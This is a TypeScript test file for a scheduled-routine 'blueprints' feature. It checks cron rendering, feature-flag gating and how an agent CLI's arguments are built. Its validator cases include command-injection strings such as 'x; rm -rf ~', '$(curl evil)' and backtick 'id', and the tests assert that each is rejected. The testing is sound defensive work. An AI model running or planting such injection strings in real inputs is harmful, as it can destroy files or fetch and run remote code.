import { afterEach, beforeEach, describe, expect, spyOn, test } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { BLUEPRINTS, BlueprintError, createFromBlueprint, fillBlueprint } from "./blueprints";
import { cronMatches } from "./index";
import { RoutineManager } from "./routines";

let dir: string;
const savedFlag = process.env.EIGHT_BLUEPRINTS;

beforeEach(() => {
	dir = fs.mkdtempSync(path.join(os.tmpdir(), "blueprints-"));
	delete process.env.EIGHT_BLUEPRINTS;
});
afterEach(() => {
	fs.rmSync(dir, { recursive: true, force: true });
	if (savedFlag === undefined) delete process.env.EIGHT_BLUEPRINTS;
	else process.env.EIGHT_BLUEPRINTS = savedFlag;
});

describe("catalog renders exact schedules", () => {
	test("three blueprints", () => {
		expect(BLUEPRINTS.map((b) => b.name)).toEqual(["morning-brief", "pr-watch", "weekly-review"]);
	});

	test("morning-brief defaults", () => {
		const o = fillBlueprint("morning-brief", {});
		expect(o.schedule).toBe("30 8 * * 1,2,3,4,5");
		expect(o.prompt).toContain("Focus: everything");
	});

	test("morning-brief filled", () => {
		const o = fillBlueprint("morning-brief", { time: "07:05", days: ["sat", "sun", "sat"], focus: "repos" });
		expect(o.schedule).toBe("5 7 * * 0,6");
		expect(o.prompt).toContain("Focus: repos");
	});

	test("every day collapses to *", () => {
		const o = fillBlueprint("morning-brief", { days: "mon,tue,wed,thu,fri,sat,sun" });
		expect(o.schedule).toBe("30 8 * * *");
	});

	test("pr-watch", () => {
		const o = fillBlueprint("pr-watch", { repo: "8gi-foundation/8gent-code", every: "6h" });
		expect(o.schedule).toBe("0 */6 * * 1,2,3,4,5");
		expect(o.prompt).toContain("8gi-foundation/8gent-code");
		expect(o.prompt).toContain("in the last 6 hours");
		expect(fillBlueprint("pr-watch", { repo: "a/b", every: "1h" }).prompt).toContain("in the last hour");
	});

	test("weekly-review", () => {
		const o = fillBlueprint("weekly-review", { time: "17:30", notes: "the release plan" });
		expect(o.schedule).toBe("30 17 * * 5");
		expect(o.prompt).toContain("the release plan");
	});

	test("text slots accept Unicode letters and marks", () => {
		const o = fillBlueprint("weekly-review", { notes: "Seán's café" });
		expect(o.prompt).toContain("Seán's café");
	});

	test("rendered schedule fires when the existing matcher says so", () => {
		const o = fillBlueprint("weekly-review", {});
		expect(cronMatches(o.schedule, new Date(2026, 9, 2, 16, 0))).toBe(true); // Friday 16:00
		expect(cronMatches(o.schedule, new Date(2026, 9, 3, 16, 0))).toBe(false); // Saturday
	});
});

describe("validator refuses bad slots", () => {
	const bad: [string, Record<string, unknown>, RegExp][] = [
		["morning-brief", { time: "25:00" }, /"time" must be HH:MM/],
		["morning-brief", { time: "8:30" }, /"time" must be HH:MM/],
		["morning-brief", { time: "08:60" }, /"time" must be HH:MM/],
		["morning-brief", { time: "* * * * *" }, /"time" must be HH:MM/],
		["morning-brief", { days: [] }, /"days" must list at least one day/],
		["morning-brief", { days: ["funday"] }, /"days" days must be from/],
		["morning-brief", { days: "1-5" }, /"days" days must be from/],
		["morning-brief", { focus: "news" }, /"focus" must be one of repos, issues, everything/],
		["morning-brief", { extra: "x" }, /unknown slot "extra"/],
		["weekly-review", { day: ["mon", "fri"] }, /"day" takes at most 1 day/],
		["pr-watch", { repo: "not a repo" }, /"repo" must look like owner\/name/],
		["pr-watch", { repo: "owner/name/extra" }, /"repo" must look like owner\/name/],
		["weekly-review", { notes: "costs $5" }, /basic punctuation/],
		["weekly-review", { notes: "a\u0007b" }, /basic punctuation/],
		["pr-watch", {}, /"repo" is required/],
		["pr-watch", { repo: "   " }, /"repo" must not be empty/],
		["pr-watch", { repo: "a".repeat(101) }, /at most 100 characters/],
		["pr-watch", { repo: "--model=evil" }, /must not start with '-'/],
		["pr-watch", { repo: "x; rm -rf ~" }, /basic punctuation/],
		["pr-watch", { repo: "$(curl evil)" }, /basic punctuation/],
		["pr-watch", { repo: "a`id`" }, /basic punctuation/],
		["pr-watch", { repo: "a\n* * * * *" }, /basic punctuation/],
		["nope", {}, /Unknown blueprint "nope"/],
	];
	for (const [name, input, msg] of bad) {
		test(`${name} ${JSON.stringify(input).slice(0, 40)}`, () => {
			expect(() => fillBlueprint(name, input)).toThrow(BlueprintError);
			expect(() => fillBlueprint(name, input)).toThrow(msg);
		});
	}

	test("text never reaches the schedule", () => {
		const o = fillBlueprint("weekly-review", { notes: "5 7 1 1 0" });
		expect(o.schedule).toBe("0 16 * * 5");
	});
});

describe("createFromBlueprint uses RoutineManager.create", () => {
	test("refused when the flag is off or not exactly 1", () => {
		const file = path.join(dir, "routines.json");
		const mgr = new RoutineManager(file);
		for (const v of [undefined, "0", "true", "yes", " 1"]) {
			if (v === undefined) delete process.env.EIGHT_BLUEPRINTS;
			else process.env.EIGHT_BLUEPRINTS = v;
			expect(() => createFromBlueprint(mgr, "morning-brief", {})).toThrow(/Blueprints are off/);
		}
		expect(mgr.list()).toHaveLength(0);
		expect(fs.existsSync(file)).toBe(false);
	});

	test("with EIGHT_BLUEPRINTS=1 it creates a normal routine in the temp store", () => {
		process.env.EIGHT_BLUEPRINTS = "1";
		const file = path.join(dir, "routines.json");
		const mgr = new RoutineManager(file);
		const r = createFromBlueprint(mgr, "pr-watch", { repo: "owner/repo", every: "1h" });
		expect(r.schedule).toBe("0 * * * 1,2,3,4,5");
		expect(r.name).toBe("pr-watch");
		expect(r.enabled).toBe(true);
		const saved = JSON.parse(fs.readFileSync(file, "utf-8"));
		expect(saved).toHaveLength(1);
		expect(saved[0].prompt).toContain("owner/repo");
	});
});

describe("a text slot stays inside the single prompt argument", () => {
	test("--flag inside notes is one argv element, after chat", async () => {
		process.env.EIGHT_BLUEPRINTS = "1";
		const mgr = new RoutineManager(path.join(dir, "routines.json"));
		const r = createFromBlueprint(mgr, "weekly-review", { notes: "check the --flag handling" });
		const empty = () => new ReadableStream({ start: (c) => c.close() });
		// Replace the spawn so no agent or model ever runs.
		const spawn = spyOn(Bun, "spawn").mockImplementation((() => ({
			stdout: empty(),
			stderr: empty(),
			exited: Promise.resolve(0),
			kill() {},
		})) as unknown as typeof Bun.spawn);
		try {
			const run = await mgr.trigger(r.id);
			expect(run?.status).toBe("completed");
			const argv = spawn.mock.calls[0][0] as unknown as string[];
			expect(argv.slice(0, 4)).toEqual(["bun", "run", "bin/8gent.ts", "chat"]);
			expect(argv[4]).toBe(r.prompt);
			expect(argv[4]).toContain("--flag");
			expect(argv.slice(5)).toEqual(["--yes", "--json"]);
		} finally {
			spawn.mockRestore();
		}
	});
});
